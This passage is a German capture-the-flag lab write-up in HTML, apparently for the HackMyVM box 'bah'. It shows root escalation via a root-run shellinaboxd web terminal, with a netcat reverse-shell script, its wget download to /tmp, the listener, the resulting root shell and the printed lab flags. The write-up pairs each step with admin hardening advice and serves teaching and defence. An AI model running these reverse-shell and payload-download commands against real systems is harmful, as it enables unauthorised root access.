+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Konfiguration von `shellinaboxd`. Versuche, dich über `http://party.bah.hmv/` (oder einen anderen Pfad) mit dem Web-Terminal zu verbinden. Prüfe, ob man durch Interaktion mit dieser Webseite oder dem Dienst Befehle als Root ausführen kann (wie im nächsten Schritt impliziert).<br><strong>Empfehlung (Admin):</strong> Sichere oder deaktiviere `shellinaboxd`. Stelle sicher, dass Web-Terminals nicht mit Root-Rechten laufen oder unsicher konfiguriert sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+rocio@bah:~$ <span class="command">./pspy64</span> <!-- Annahme: pspy64 wurde hochgeladen -->
+...
+CMD: UID=0    PID=XXX   | /usr/bin/shellinaboxd -q
+...
+rocio@bah:/usr/bin$ <span class="command">ls -la shell*</span>
+-rwxr-xr-x 1 root root 406160 Aug  7  2019 shellinaboxd
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (rocio zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein Reverse-Shell-Skript (`dev`) wird auf dem Angreifer-System erstellt, per HTTP bereitgestellt, auf das Zielsystem (`/tmp`) heruntergeladen und ausführbar gemacht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung der Payload für den nächsten Schritt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starte den Listener und löse die Ausführung des Skripts aus.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+              <!-- Payload Prep -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi dev</span></div>
+                      <pre>
+#!/bin/bash
+nc -e /bin/bash 192.168.2.140 9002
+                      </pre>
+                 </div>
+             </div>
+              <!-- HTTP Server -->
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 8000</span></div>
+                      <pre>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.2.128 - - [10/Oct/2022 10:57:39] "GET /dev HTTP/1.1" 200 -
+                      </pre>
+                  </div>
+              </div>
+               <!-- Wget & Chmod auf Ziel -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+rocio@bah:/tmp$ <span class="command">wget http://192.168.2.140:8000/dev</span>
+--2022-10-10 04:57:43--  http://192.168.2.140:8000/dev
+Connecting to 192.168.2.140:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 48 [application/octet-stream]
+Saving to: ‘dev’
+
+dev                 100%[===================>]      48  --.-KB/s    in 0s
+
+2022-10-10 04:57:43 (20.5 MB/s) - ‘dev’ saved [48/48]
+rocio@bah:/tmp$ <span class="command">chmod +x dev</span>
+                      </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 9002 gestartet. Eine Notiz besagt, dass das Aufrufen von `http://party.bah.hmv/devel/` und das Klicken eines "Connect"-Buttons den Exploit auslöst.</p>
+            <p class="evaluation"><strong>Bewertung: !!Exploit-Trigger identifiziert!!** Die Webseite auf `party.bah.hmv` (wahrscheinlich `shellinaboxd`) hat unter `/devel/` eine Funktion, die es ermöglicht, das Skript `/tmp/dev` auszuführen. Da `shellinaboxd` als Root läuft, wird auch das Skript `/tmp/dev` als Root ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe die Aktion auf der Webseite durch, um die Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne oder sichere die unsichere Funktion unter `/devel/`. Führe `shellinaboxd` nicht als Root aus. Beschränke die Ausführungsrechte aus `/tmp`.</p>
+            <!-- Listener -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                     <pre>
+listening on [any] 9002 ...
+                     </pre>
+                 </div>
+             </div>
+              <!-- Trigger Note -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, nur Notiz -->
+                     <pre>
+# Auslösen des Exploits:
+# Öffne http://party.bah.hmv/devel/ im Browser
+# Klicke auf den [Connect] Button (dies führt /tmp/dev als Root aus)
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 9002 empfängt die Verbindung, nachdem der Exploit über die Webseite ausgelöst wurde. Der `id`-Befehl wird ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Die eingehende Shell hat `uid=0(root)`. Der Root-Zugriff wurde durch die Ausnutzung der `shellinaboxd`-Fehlkonfiguration erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Behebe die `shellinaboxd`-Schwachstelle/Fehlkonfiguration.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                     <pre>
+listening on [any] 9002 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.128] 36510
+<span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+# <!-- Root Prompt -->
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird die Root-Flag gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Root-Flag `<span class="password">HMVssssshell323</span>` erfolgreich gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# <span class="command">cd /root</span>
+# <span class="command">ls</span>
+root.txt
+# <span class="command">cat root.txt</span>
+<span class="password">HMVssssshell323</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMVssssshell323</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/rocio/user.txt</div> <!-- Korrekter Pfad -->
+                     <div class="flag-value"><span class="password">HdsaMoiuVdsaeqw</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 10. Oktober 2022</p>
+    </footer>
+</body>
+</html>
